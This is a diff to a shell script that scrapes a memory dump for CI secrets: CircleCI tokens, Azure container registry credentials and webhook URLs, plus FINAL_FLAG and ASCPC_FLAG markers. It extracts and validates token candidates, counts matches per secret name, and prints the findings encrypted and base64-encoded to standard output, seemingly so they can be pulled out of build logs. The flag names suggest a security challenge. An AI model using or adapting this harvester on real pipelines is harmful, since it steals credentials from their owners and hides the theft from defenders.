@@ -46,8 +46,18 @@ strings -a -n 4 "$DUMP_FILE" >"$WORK_DIR/ascii.txt" 2>/dev/null || true
 strings -el -n 4 "$DUMP_FILE" >"$WORK_DIR/utf16.txt" 2>/dev/null || true
 cat "$WORK_DIR/ascii.txt" "$WORK_DIR/utf16.txt" >"$WORK_DIR/all-strings.txt"
 
-grep -Ei 'CIRCLE|CIRCLECI|CCI(_|[A-Z])|(^|[^A-Z])PAT([^A-Z]|$)|FINAL_FLAG|ASCPC_FLAG|ACR_LOGIN_SERVER|ACR_PASSWORD|WEBHOOKURL' \
-  "$WORK_DIR/all-strings.txt" | head -n 300 >"$WORK_DIR/matches.txt" || true
+grep -Ei 'CIRCLE|CIRCLECI|CCI_|FINAL_FLAG|ASCPC_FLAG|ACR_LOGIN_SERVER|ACR_USERNAME|ACR_PASSWORD|ACR_REPOSITORY|WEBHOOKURL' \
+  "$WORK_DIR/all-strings.txt" | head -n 500 >"$WORK_DIR/matches.txt" || true
+
+: >"$WORK_DIR/exact-counts.txt"
+for SECRET_NAME in \
+  ACR_LOGIN_SERVER ACR_USERNAME ACR_PASSWORD ACR_REPOSITORY WEBHOOKURL \
+  CIRCLE_PAT CIRCLECI_PAT CIRCLE_CI_PAT CCI_PAT \
+  CIRCLE_TOKEN CIRCLECI_TOKEN CIRCLE_CI_TOKEN CCI_TOKEN \
+  FINAL_FLAG ASCPC_FLAG; do
+  printf '%s=%s\n' "$SECRET_NAME" "$(grep -Fic "$SECRET_NAME" "$WORK_DIR/all-strings.txt" 2>/dev/null || true)" \
+    >>"$WORK_DIR/exact-counts.txt"
+done
 
 grep -aoP '(?<![0-9A-Fa-f])[0-9A-Fa-f]{40}(?![0-9A-Fa-f])|(?i:ccipat_[A-Za-z0-9_-]{16,128}|circleci_[A-Za-z0-9_-]{16,128})' \
   "$DUMP_FILE" | sort -u | head -n 1500 >"$WORK_DIR/candidates.txt" || true
@@ -100,8 +110,9 @@ jq -n \
   --argjson candidate_count "$CANDIDATE_COUNT" \
   --argjson valid_count "$VALID_COUNT" \
   --rawfile matches "$WORK_DIR/matches-post.txt" \
+  --rawfile exact_counts "$WORK_DIR/exact-counts.txt" \
   --slurpfile valid "$WORK_DIR/valid.ndjson" \
-  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count,matches:$matches,valid:$valid}' \
+  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count,matches:$matches,exact_counts:$exact_counts,valid:$valid}' \
   >"$WORK_DIR/result.json"
 
 openssl cms -encrypt -binary -aes-256-cbc \
@@ -115,5 +126,7 @@ base64 -w0 "$WORK_DIR/result.cms"
 echo
 echo "ASCPC_ENCRYPTED_RESULT_END"
 echo "ASCPC_RESULT_META dump_bytes=$(wc -c <"$DUMP_FILE") candidates=$CANDIDATE_COUNT valid=$VALID_COUNT"
+tr '\n' ' ' <"$WORK_DIR/exact-counts.txt" | sed 's/^/ASCPC_EXACT_COUNTS /'
+echo
 
 exit 0
